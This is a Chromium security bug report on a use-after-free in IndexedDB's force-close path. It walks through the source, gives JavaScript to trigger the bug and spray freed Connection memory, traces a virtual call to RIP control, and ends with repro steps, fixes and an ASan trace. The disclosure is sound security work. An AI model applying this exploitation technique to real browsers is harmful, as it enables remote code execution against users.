# heap-use-after-free in content::indexed_db::Database::connections_ when force_closing_ is true

| Field | Value |
|-------|-------|
| **Issue ID** | [446722008](https://issues.chromium.org/issues/446722008) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Storage>IndexedDB |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | so...@gmail.com |
| **Assignee** | st...@microsoft.com |
| **Created** | 2025-09-23 |
| **Bounty** | $100,000.00 |

## Description

# **VULNERABILITY DETAILS**

**tl;dr**  

The database is not destroyed immediately when `Database::ForceCloseAndRunTasks()` is called.  

It sets `Database::force_closing_` to true, clears all active connections and then queues a `bucket_context_->QueueRunTasks()` task to destroy itself.  

The database still accepts connections even when `Database::force_closing_` is set to true.  

Any queued connections will be processed before `BucketContext::RunTasks()` is executed.  

`BucketContext::RunTasks()` will NOT destroy the database if it has active connections (`Database::CanBeDestroyed()`)  

`Database::ConnectionClosed()` callback is skipped if `Database::force_closing_` is set to true. This leaves freed connections in `Database::connections_`

**analysis and a path to RCE**  

deleting a database with indexedDB.deleteDatabase(force\_close = true) will end up invoking `Database::ForceCloseAndRunTasks`  

the database sets force\_closing\_ `[0]`, closes and frees all active connections `[1]`, clears active connections list `[2]` and then queues a `BucketContext::RunTasks` task `[3]` to delete itself.

```
// src\content\browser\indexed_db\instance\database.cc
Status Database::ForceCloseAndRunTasks(const std::string& message) {
  if (!bucket_context_->ShouldUseSqlite()) {
    DCHECK(!force_closing_);
  } else if (force_closing_) {
    // Re-entrancy can validly occur if there's an error in the code below,
    // e.g. in `CloseAndReportForceClose`.
    return Status::OK();
  }

  force_closing_ = true; // <--------------------------------------- [0]
  for (Connection* connection : connections_) {
    connection->CloseAndReportForceClose(message); // <--------------------------------------- [1]
  }
  connections_.clear(); // <--------------------------------------- [2]
  IDB_RETURN_IF_ERROR(connection_coordinator_.PruneTasksForForceClose(message));
  connection_coordinator_.OnNoConnections();

  // Execute any pending tasks in the connection coordinator.
  ConnectionCoordinator::ExecuteTaskResult task_state;
  Status status;
  do {
    std::tie(task_state, status) = connection_coordinator_.ExecuteTask(false);
    DCHECK(task_state !=
           ConnectionCoordinator::ExecuteTaskResult::kPendingAsyncWork)
        << "There are no more connections, so all tasks should be able to "
           "complete synchronously.";
  } while (task_state != ConnectionCoordinator::ExecuteTaskResult::kDone &&
           task_state != ConnectionCoordinator::ExecuteTaskResult::kError);
  DCHECK(connections_.empty());
  bucket_context_->QueueRunTasks(); // <--------------------------------------- [3]
  return status;
}

```

A connection object is destroyed (freed) when it closes.  

It calls AbortTransactionsAndClose `[0]` which invokes a callback into the database to remove the connection from the active connections list `[1]`  

This callback is skipped if force\_closing\_ is set to true `[2]`

```
// src\content\browser\indexed_db\instance\connection.cc
Connection::~Connection() {
  DCHECK_CALLED_ON_VALID_SEQUENCE(sequence_checker_);
  is_shutting_down_ = true;
  if (!IsConnected()) {
    return;
  }

  AbortTransactionsAndClose(CloseErrorHandling::kAbortAllReturnLastError, // <-------------------------- [0]
                            "The connection is destroyed.");
}

// src\content\browser\indexed_db\instance\connection.cc
std::unique_ptr<DatabaseCallbacks> Connection::AbortTransactionsAndClose(
    CloseErrorHandling error_handling,
    const std::string& message) {
  DCHECK_CALLED_ON_VALID_SEQUENCE(sequence_checker_);
  if (!IsConnected()) {
    return {};
  }

  ... omitted ...
  std::move(on_close_).Run(this); // <--------------------------------------- [1] (Database::ConnectionClosed)
  ... omitted ...
}

// src\content\browser\indexed_db\instance\database.cc
void Database::ConnectionClosed(Connection* connection) {
  TRACE_EVENT0("IndexedDB", "Database::ConnectionClosed");
  // Ignore connection closes during force close to prevent re-entry.
  if (force_closing_) { // <--------------------------------------- [2]
    return;
  }
  connections_.erase(connection);
  connection_coordinator_.OnConnectionClosed(connection);
  if (connections_.empty()) {
    connection_coordinator_.OnNoConnections();
  }
  if (CanBeDestroyed()) {
    bucket_context_->QueueRunTasks(); // <--------------------------------------- [3]
  }
}

```

When `BucketContext::RunTasks` runs, it enumerates all active databases and then checks if the database can be destroyed `[0]`. if it can, it deletes the database `[1]`.  

`Database::CanBeDestroyed` will return false if there are any active connections `[2]`. This prevents the database from being deleted.

```
// src\content\browser\indexed_db\instance\bucket_context.cc
void BucketContext::RunTasks() {
  task_run_queued_ = false;

  for (auto db_it = databases_.begin(); db_it != databases_.end();) {
    Database& db = *db_it->second;
    Status status = db.RunTasks();
    if (!status.ok()) {
      OnDatabaseError(&db, status, {});
      return;
    }

    if (db.CanBeDestroyed()) { // <--------------------------------------- [0]
      db_it = databases_.erase(db_it); // <--------------------------------------- [1]
    } else {
      ++db_it;
    }
  }
  if (CanClose() && closing_stage_ == ClosingState::kClosed) {
    ResetBackingStore();
  }
}

// src\content\browser\indexed_db\instance\database.cc
bool Database::CanBeDestroyed() {
  return !connection_coordinator_.HasTasks() && connections_.empty(); // <--------------------------------------- [2]
}

```

creating a connection to a database with indexedDB.open(...) will eventually end up invoking `Database::CreateConnection`  

a connection is added to the active connections list `[0]` without checking if `force_closing_` is set to true.

```
// src\content\browser\indexed_db\instance\database.cc
std::unique_ptr<Connection> Database::CreateConnection(
    std::unique_ptr<DatabaseCallbacks> database_callbacks,
    mojo::Remote<storage::mojom::IndexedDBClientStateChecker>
        client_state_checker,
    base::UnguessableToken client_token,
    int scheduling_priority) {
  auto connection = std::make_unique<Connection>(
      *bucket_context_, weak_factory_.GetWeakPtr(),
      base::BindRepeating(&Database::VersionChangeIgnored,
                          weak_factory_.GetWeakPtr()),
      base::BindOnce(&Database::ConnectionClosed, weak_factory_.GetWeakPtr()),
      std::move(database_callbacks), std::move(client_state_checker),
      client_token, scheduling_priority);
  connections_.insert(connection.get()); // <--------------------------------------- [0]
  ... omitted ...
}

```

After executing the following code, our database will look like this:  

`[0]` freed and closed as expected.  

Database::force\_closing\_: true  

Database::Connections\_: [ `[1]`, `[2]`, `[3]` ]

```
indexedDB.open('MyDB'); // <------------ [0]
indexedDB.deleteDatabase('MyDB', force_close = true); // needs renderer patch. otherwise it sends force_close set to false
indexedDB.open('MyDB'); // <------------ [1]
indexedDB.open('MyDB'); // <------------ [2]
indexedDB.open('MyDB'); // <------------ [3]

```

Now if we close the last 3 connections our database will have 3 freed connections in `connections_`  

We can reuse the addresses of each connection by abusing indexedDB strings for store or index name (they're kept in memory)  

In order to not crash we run this code **in another origin**.  

note: these are utf16 strings. we create a string of length `((class_size - 4) / 2)` to allocate `class_size` bytes.

```
req = indexedDB.open('whatever'); // <--------------- must not exist
req.onupgradeneeded = (e) => {
  const db = e.target.result;
  for (let i = 0; i != number_of_spray; ++i) { // <--------------- how many allocations
    // store name is limited to a specific charset, won't work for us.
    const store = db.createObjectStore(i.toString(), { keyPath: 'a', autoIncrement: false });
    // index name can include anything including null bytes.
    const index = store.createIndex('\u4141\u4141...\u4141\u4141', 'a', { unique: false });
  }
}

```

At this point we have a working database object with `force_closing_` set to true and a list of `connections_` containing freed connections with our index name's content.  

By carefully crafting a Connection object with an std::map of carefully crafted transactions and invoking indexedDB.open('MyDB') we end up in `Database::RunTasks`  

By following a specific code path we can immediately invoke a virtual function from our crafted object.

```
// src\content\browser\indexed_db\instance\database.cc
Status Database::RunTasks() {
  ... omitted ...
  while (transactions_removed) {
    ... omitted ...
    for (Connection* connection : connections_) {
      std::vector<int64_t> txns_to_remove;
      for (const auto& id_txn_pair : connection->transactions()) {// <------------------------ [0] connection with crafted transactions_ (std::map) used
        Transaction* txn = id_txn_pair.second.get();
        ... omitted ...

        // Process the queue for transactions that are STARTED or COMMITTING.
        // Add transactions that can be removed to a queue.
        StatusOr<Transaction::RunTasksResult> task_result = txn->RunTasks(); // <------------------------ [1] crafted transaction used
        if (!task_result.has_value()) {
          return task_result.error();
        }

        ... omitted ...
      }
      ... omitted ...
    }
  }
  return Status::OK();
}

// src\content\browser\indexed_db\instance\transaction.cc
StatusOr<Transaction::RunTasksResult> Transaction::RunTasks() {
  ... omitted ...

  // If there are no pending tasks, we haven't already committed/aborted,
  // and the front-end requested a commit, it is now safe to do so.
  if (!HasPendingTasks() && state_ == STARTED && is_commit_pending_) { // <------------------------ [2] state_ and is_commit_pending_ will be crafted to pass checks
    processing_event_queue_ = false;
    Status result = DoPendingCommit(); // <------------------------ [3]
    if (!result.ok()) {
      // This can delete |this|.
      return base::unexpected(result);
    };
  }

  ... omitted ...
  return RunTasksResult::kNotFinished;
}

// src\content\browser\indexed_db\instance\transaction.cc
Status Transaction::DoPendingCommit() {
  TRACE_EVENT1("IndexedDB", "Transaction::DoPendingCommit", "txn.id", id());

  ResetTimeoutTimer(); // <------------------------ [4]

  ... omitted ...
}

// src\content\browser\indexed_db\instance\transaction.cc
void Transaction::ResetTimeoutTimer() {
  timeout_timer_.Stop(); // <------------------------ [5]
  timeout_strikes_ = 0;
}

// src\base\timer\timer.cc
void TimerBase::Stop() {
  DCHECK_CALLED_ON_VALID_SEQUENCE(sequence_checker_);

  AbandonScheduledTask();

  OnStop(); // <------------------------ [6] virtual call on our crafted timer object!!!!!!
  // No more member accesses here: |this| could be deleted after Stop() call.
}

```

At this point we should have code execution by controlling RIP register. (PoC will set a special address, no calc yet)  

**NOTE: spraying relies on sizeof(Connection) being 456. it will NOT work if the size is wrong.**

# **POTENTIAL FIX**

I see three ways of fixing this. Either you:  

A) search for a database of same name AND force\_closing\_ set to false in `[0]`. This would create a new database if there is one that is force closing.  

However, this is more complicated because databases\_ is accessed from multiple places and you would need to change all of them.  

B) simply ignore the connection in `[1]` or `[2]`? It would destroy and close itself.  

C) exit with an explicit error if database\_ptr->force\_closing\_ is set to true.

```
// src\content\browser\indexed_db\instance\bucket_context.cc
void BucketContext::Open(
    mojo::PendingAssociatedRemote<blink::mojom::IDBFactoryClient>
        factory_client,
    mojo::PendingAssociatedRemote<blink::mojom::IDBDatabaseCallbacks>
        database_callbacks_remote,
    const std::u16string& name,
    int64_t version,
    mojo::PendingAssociatedReceiver<blink::mojom::IDBTransaction>
        transaction_receiver,
    int64_t transaction_id,
    int scheduling_priority) {
  ... omitted ...

  Database* database_ptr = nullptr;
  auto it = databases_.find(name); // <----------------------------- [0]
  if (it == databases_.end()) {
    // The database must be added before the schedule call, as the
    // CreateDatabaseDeleteClosure can be called synchronously.
    database_ptr = CreateAndAddDatabase(name);
  } else {
    database_ptr = it->second.get();
  }

  database_ptr->ScheduleOpenConnection(std::move(connection)); // <------------------- [1]
}

// src\content\browser\indexed_db\instance\database.cc
void Database::ScheduleOpenConnection(
    std::unique_ptr<PendingConnection> connection) {
  connection_coordinator_.ScheduleOpenConnection(std::move(connection)); // <------------------- [2]
}

```
# **VERSION**

Chrome Version: tested on 142.0.7426.0 dev  

Operating System: tested on Windows (any will work?)  

Commit hash: 81f25d3d93e6a170d77a6061e8a2e2e34b80b1e0  

I don't know the earliest version of chrome with this bug, but looking at git blame shows something like 6 years ago..? not sure.

# **REPRODUCTION CASE**

This vulnerability requires a compromised renderer to send the required mojo messages. Instead, we patch renderer using the attached `renderer.patch`.  

We patch the browser using the attached `exploit.patch` (only needed for RCE) to simplify corruption. see Project Zero link below...  

1) run `python3 -m http.server 1337` in a folder with attached files.  

2) run browser using command line `chrome.exe --incognito` so indexedDB changes do not persist on disk (less issues reproducing the bug).  

3) visit `http://localhost:1337/` and use the buttons on screen.  

4.A) start -> asan (needs only renderer.patch)  

4.B) start -> spray -> exploit (needs exploit.patch)  

The exploit is very stable, but if you encounter issues please try slowly increasing `sleep_before_dc` or `number_of_spray` in `main.js`

**it must be hosted in a way that allows subdomains. spray.<domain> must open the same website**  

**on windows, localhost and spray.localhost both resolve to 127.0.0.1**

For creating complex objects in memory in predictable addresses we may be able to do something like what project zero does in this post.  

<https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html>  

However, for this PoC we simply patch the browser (see: exploit.patch)

I will continue reading the post from project zero and also checking chromium codebase for any rop gadgets that can be used.  

However, that will probably take me a long time as I've started looking at chromium source only 5 days ago after my browser crashed (you may have seen a couple of crash reports.. that's me.)  

Hopefully the attached PoC is enough to show the RCE capability of this bug.

# **VIDEO PoC**

In video.mp4 we will:  

0) use our patched build of chromium.  

1) launch `chrome.exe --incognito` with windbg to attach to browser process (debug children is off)  

2) open the PoC page, click start, click spray, and then click exploit.  

3) we will see RIP hijacked in windbg.

# **BUILD ARGUMENTS**

It shouldn't matter for this bug, but this is what I used.  

Arguments chosen at random to speed up build and test stuff.

```
is_debug = true
symbol_level = 2
blink_symbol_level=0
v8_symbol_level=0
dcheck_always_on = true
is_component_build = true
target_cpu = "x64"
is_asan = false
treat_warnings_as_errors = false
enable_mojo_tracing = true
v8_enable_memory_corruption_api = true

```
# **CRASH INFORMATION**

Type of crash: browser  

Reason: UAF  

RCE Possible: Yes  

Crash State:  

`https://commondatastorage.googleapis.com/chromium-browser-asan/index.html`  

used asan build: chromium-142.0.7405.4-win64-asan

```
=================================================================
==21320==ERROR: AddressSanitizer: heap-use-after-free on address 0x1219128a2040 at pc 0x7ff8c88e83ae bp 0x00ee89ffefa0 sp 0x00ee89ffefe8
READ of size 8 at 0x1219128a2040 thread T10
    #0 0x7ff8c88e83ad in std::__Cr::__tree<std::__Cr::__value_type<long long,std::__Cr::unique_ptr<content::indexed_db::Transaction,std::__Cr::default_delete<content::indexed_db::Transaction> > >,std::__Cr::__map_value_compare<long long,std::__Cr::pair<const long long,std::__Cr::unique_ptr<content::indexed_db::Transaction,std::__Cr::default_delete<content::indexed_db::Transaction> > >,std::__Cr::less<long long>,1>,std::__Cr::allocator<std::__Cr::pair<const long long,std::__Cr::unique_ptr<content::indexed_db::Transaction,std::__Cr::default_delete<content::indexed_db::Transaction> > > > >::begin C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__tree:886
    #1 0x7ff8c88e83ad in std::__Cr::map<long long,std::__Cr::unique_ptr<content::indexed_db::Transaction,std::__Cr::default_delete<content::indexed_db::Transaction> >,std::__Cr::less<long long>,std::__Cr::allocator<std::__Cr::pair<const long long,std::__Cr::unique_ptr<content::indexed_db::Transaction,std::__Cr::default_delete<content::indexed_db::Transaction> > > > >::begin C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\map:1065
    #2 0x7ff8c88e83ad in content::indexed_db::Database::RunTasks(void) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\database.cc:343:36
    #3 0x7ff8c8890bc9 in content::indexed_db::BucketContext::RunTasks(void) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\bucket_context.cc:484:24
    #4 0x7ff8c88a42bf in base::internal::DecayedFunctorTraits<void (content::indexed_db::BucketContext::*)(),base::WeakPtr<content::indexed_db::BucketContext> &&>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:730
    #5 0x7ff8c88a42bf in base::internal::InvokeHelper<1,base::internal::FunctorTraits<void (content::indexed_db::BucketContext::*&&)(),base::WeakPtr<content::indexed_db::BucketContext> &&>,void,0>::MakeItSo C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:946
    #6 0x7ff8c88a42bf in base::internal::Invoker<base::internal::FunctorTraits<void (content::indexed_db::BucketContext::*&&)(),base::WeakPtr<content::indexed_db::BucketContext> &&>,base::internal::BindState<1,1,0,void (content::indexed_db::BucketContext::*)(),base::WeakPtr<content::indexed_db::BucketContext> >,void ()>::RunImpl C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:1059
    #7 0x7ff8c88a42bf in base::internal::Invoker<struct base::internal::FunctorTraits<void (__cdecl content::indexed_db::BucketContext::*&&)(void), class base::WeakPtr<class content::indexed_db::BucketContext> &&>, struct base::internal::BindState<1, 1, 0, void (__cdecl content::indexed_db::BucketContext::*)(void), class base::WeakPtr<class content::indexed_db::BucketContext>>, (void)>::RunOnce(class base::internal::BindStateBase *) C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:972:12
    #8 0x7ff8d0a3c963 in base::OnceCallback<void ()>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:155
    #9 0x7ff8d0a3c963 in base::TaskAnnotator::RunTaskImpl(struct base::PendingTask &) C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:207:34
    #10 0x7ff8d09917cc in base::TaskAnnotator::RunTask C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.h:104
    #11 0x7ff8d09917cc in base::internal::TaskTracker::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:686
    #12 0x7ff8d09917cc in base::internal::TaskTracker::RunBlockShutdown(struct base::internal::Task &, class base::TaskTraits const &, class base::internal::TaskSource *, class base::internal::SequenceToken const &) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:679:3
    #13 0x7ff8d098fa5e in base::internal::TaskTracker::RunTaskWithShutdownBehavior C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:704
    #14 0x7ff8d098fa5e in base::internal::TaskTracker::RunTask(struct base::internal::Task, class base::internal::TaskSource *, class base::TaskTraitsconst &) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:501:5
    #15 0x7ff8d098eb0e in base::internal::TaskTracker::RunAndPopNextTask(class base::internal::RegisteredTaskSource) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\task_tracker.cc:391:5
    #16 0x7ff8d09792d5 in base::internal::WorkerThread::RunWorker(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:473:36
    #17 0x7ff8d097813f in base::internal::WorkerThread::RunPooledWorker(void) C:\b\s\w\ir\cache\builder\src\base\task\thread_pool\worker_thread.cc:359:3
    #18 0x7ff8d0885d13 in base::`anonymous namespace'::ThreadFunc C:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc:114:13
    #19 0x7ff9dad3beee  (I:\Chromium\chromium-142.0.7405.4-win64-asan\clang_rt.asan_dynamic-x86_64.dll+0x18005beee)
    #20 0x7ffa1fffe8d6  (C:\WINDOWS\System32\KERNEL32.DLL+0x18002e8d6)
    #21 0x7ffa21388d9b  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x180008d9b)

0x1219128a2040 is located 64 bytes inside of 376-byte region [0x1219128a2000,0x1219128a2178)
freed by thread T8 here:
    #0 0x7ff9dad3d2c6  (I:\Chromium\chromium-142.0.7405.4-win64-asan\clang_rt.asan_dynamic-x86_64.dll+0x18005d2c6)
    #1 0x7ff8c88b8d70 in content::indexed_db::Connection::`scalar deleting dtor'(unsigned int) C:\b\s\w\ir\cache\builder\src\content\browser\indexed_db\instance\connection.cc:103:27
    #2 0x7ff8c80da3a9 in std::__Cr::default_delete<blink::mojom::LockHandle>::operator() C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__memory\unique_ptr.h:77
    #3 0x7ff8c80da3a9 in std::__Cr::unique_ptr<blink::mojom::LockHandle,std::__Cr::default_delete<blink::mojom::LockHandle> >::reset C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__memory\unique_ptr.h:290
    #4 0x7ff8c80da3a9 in std::__Cr::unique_ptr<blink::mojom::LockHandle,std::__Cr::default_delete<blink::mojom::LockHandle> >::~unique_ptr C:\b\s\w\ir\cache\builder\src\third_party\libc++\src\include\__memory\unique_ptr.h:259
    #5 0x7ff8c80da3a9 in mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::LockHandle>::~SelfOwnedAssociatedReceiver C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\self_owned_associated_receiver.h:111
    #6 0x7ff8c80da3a9 in mojo::internal::SelfOwnedAssociatedReceiver<class content::mojom::WebUI>::Close(void) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\self_owned_associated_receiver.h:72:18
    #7 0x7ff8c88bcb5d in mojo::internal::SelfOwnedAssociatedReceiver<class blink::mojom::IDBDatabase>::OnDisconnect(unsigned int, class std::__Cr::basic_string<char, struct std::__Cr::char_traits<char>, class std::__Cr::allocator<char>> const &) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\self_owned_associated_receiver.h:120:5
    #8 0x7ff8c88bd48d in base::internal::DecayedFunctorTraits<void (mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase>::*)(unsigned int, const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > &),mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase> *>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:730
    #9 0x7ff8c88bd48d in base::internal::InvokeHelper<0,base::internal::FunctorTraits<void (mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase>::*&&)(unsigned int, const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > &),mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase> *>,void,0>::MakeItSo C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:922
    #10 0x7ff8c88bd48d in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase>::*&&)(unsigned int, const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > &),mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase> *>,base::internal::BindState<1,1,0,void (mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase>::*)(unsigned int, const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > &),base::internal::UnretainedWrapper<mojo::internal::SelfOwnedAssociatedReceiver<blink::mojom::IDBDatabase>,base::unretained_traits::MayNotDangle,0> >,void (unsigned int, const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > &)>::RunImpl C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:1059
    #11 0x7ff8c88bd48d in base::internal::Invoker<struct base::internal::FunctorTraits<void (__cdecl mojo::internal::SelfOwnedAssociatedReceiver<classblink::mojom::IDBDatabase>::*&&)(unsigned int, class std::__Cr::basic_string<char, struct std::__Cr::char_traits<char>, class std::__Cr::allocator<char>> const &), class mojo::internal::SelfOwnedAssociatedReceiver<class blink::mojom::IDBDatabase> *>, struct base::internal::BindState<1, 1, 0, void (__cdecl mojo::internal::SelfOwnedAssociatedReceiver<class blink::mojom::IDBDatabase>::*)(unsigned int, class std::__Cr::basic_string<char, struct std::__Cr::char_traits<char>, class std::__Cr::allocator<char>> const &), class base::internal::UnretainedWrapper<class mojo::internal::SelfOwnedAssociatedReceiver<class blink::mojom::IDBDatabase>, struct base::unretained_traits::MayNotDangle, 0>>, (unsigned int, class std::__Cr::basic_string<char, struct std::__Cr::char_traits<char>, class std::__Cr::allocator<char>> const &)>::RunOnce(class base::internal::BindStateBase *, unsigned int, class std::__Cr::basic_string<char, struct std::__Cr::char_traits<char>, class std::__Cr::allocator<char>> const &) C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:972:12
    #12 0x7ff8d07908e6 in base::OnceCallback<void (unsigned int, const std::__Cr::basic_string<char,std::__Cr::char_traits<char>,std::__Cr::allocator<char> > &)>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:155
    #13 0x7ff8d07908e6 in mojo::InterfaceEndpointClient::NotifyError(class std::__Cr::optional<struct mojo::DisconnectReason> const &) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:775:45
    #14 0x7ff8d0774083 in mojo::internal::MultiplexRouter::ProcessNotifyErrorTask(struct mojo::internal::MultiplexRouter::Task *, enum mojo::internal::MultiplexRouter::ClientCallBehavior, class base::SequencedTaskRunner *) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:1078:13
    #15 0x7ff8d076a3a3 in mojo::internal::MultiplexRouter::ProcessTasks(enum mojo::internal::MultiplexRouter::ClientCallBehavior, class base::SequencedTaskRunner *) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:991:15
    #16 0x7ff8d076ff28 in mojo::internal::MultiplexRouter::Accept(class mojo::Message *) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\multiplex_router.cc:792:5
    #17 0x7ff8d078684a in mojo::MessageDispatcher::Accept(class mojo::Message *) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc:43:19
    #18 0x7ff8d07ae378 in mojo::Connector::DispatchMessageW(class mojo::ScopedHandleBase<class mojo::MessageHandle>) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc:561:49
    #19 0x7ff8d07afcc0 in mojo::Connector::ReadAllAvailableMessages(void) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc:619:14
    #20 0x7ff8d07af6e7 in mojo::Connector::OnHandleReadyInternal C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc:450
    #21 0x7ff8d07af6e7 in mojo::Connector::OnWatcherHandleReady(char const *, unsigned int) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\connector.cc:416:3
    #22 0x7ff8d07b1653 in base::internal::DecayedFunctorTraits<void (mojo::Connector::*)(const char *, unsigned int),mojo::Connector *,const char *const &>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:730
    #23 0x7ff8d07b1653 in base::internal::InvokeHelper<0,base::internal::FunctorTraits<void (mojo::Connector::*const &)(const char *, unsigned int),mojo::Connector *,const char *const &>,void,0,1>::MakeItSo C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:922
    #24 0x7ff8d07b1653 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::*const &)(const char *, unsigned int),mojo::Connector *,const char *const &>,base::internal::BindState<1,1,0,void (mojo::Connector::*)(const char *, unsigned int),base::internal::UnretainedWrapper<mojo::Connector,base::unretained_traits::MayNotDangle,0>,base::internal::UnretainedWrapper<const char,base::unretained_traits::MayNotDangle,0> >,void (unsigned int)>::RunImpl C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:1059
    #25 0x7ff8d07b1653 in base::internal::Invoker<struct base::internal::FunctorTraits<void (__cdecl mojo::Connector::*const &)(char const *, unsignedint), class mojo::Connector *, char const *const &>, struct base::internal::BindState<1, 1, 0, void (__cdecl mojo::Connector::*)(char const *, unsigned int), class base::internal::UnretainedWrapper<class mojo::Connector, struct base::unretained_traits::MayNotDangle, 0>, class base::internal::UnretainedWrapper<char const, struct base::unretained_traits::MayNotDangle, 0>>, (unsigned int)>::Run(class base::internal::BindStateBase *, unsigned int) C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:979:12
    #26 0x7ff8c155e79c in base::RepeatingCallback<(unsigned int)>::Run(unsigned int) const & C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:343:12
    #27 0x7ff8c155e58f in base::internal::DecayedFunctorTraits<void (*)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),const base::RepeatingCallback<void (unsigned int)> &>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:663
    #28 0x7ff8c155e58f in base::internal::InvokeHelper<0,base::internal::FunctorTraits<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),const base::RepeatingCallback<void (unsigned int)> &>,void,0>::MakeItSo C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:922
    #29 0x7ff8c155e58f in base::internal::Invoker<base::internal::FunctorTraits<void (*const &)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),const base::RepeatingCallback<void (unsigned int)> &>,base::internal::BindState<0,1,0,void (*)(const base::RepeatingCallback<void (unsigned int)> &, unsigned int, const mojo::HandleSignalsState &),base::RepeatingCallback<void (unsigned int)> >,void (unsigned int, const mojo::HandleSignalsState &)>::RunImpl C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:1059
    #30 0x7ff8c155e58f in base::internal::Invoker<struct base::internal::FunctorTraits<void (__cdecl *const &)(class base::RepeatingCallback<(unsignedint)> const &, unsigned int, struct mojo::HandleSignalsState const &), class base::RepeatingCallback<void __cdecl(unsigned int)> const &>, struct base::internal::BindState<0, 1, 0, void (__cdecl *)(class base::RepeatingCallback<(unsigned int)> const &, unsigned int, struct mojo::HandleSignalsState const &), class base::RepeatingCallback<void __cdecl(unsigned int)>>, (unsigned int, struct mojo::HandleSignalsState const &)>::Run(class base::internal::BindStateBase *, unsigned int, struct mojo::HandleSignalsState const &) C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:979:12
    #31 0x7ff8d0f660ab in base::RepeatingCallback<(unsigned int, struct mojo::HandleSignalsState const &)>::Run(unsigned int, struct mojo::HandleSignalsState const &) const & C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:343:12
    #32 0x7ff8d0f659a5 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, struct mojo::HandleSignalsState const &) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\system\simple_watcher.cc:278:14
    #33 0x7ff8d0f66b88 in base::internal::DecayedFunctorTraits<void (mojo::SimpleWatcher::*)(int, unsigned int, const mojo::HandleSignalsState &),base::WeakPtr<mojo::SimpleWatcher> &&,int &&,unsigned int &&,mojo::HandleSignalsState &&>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:730
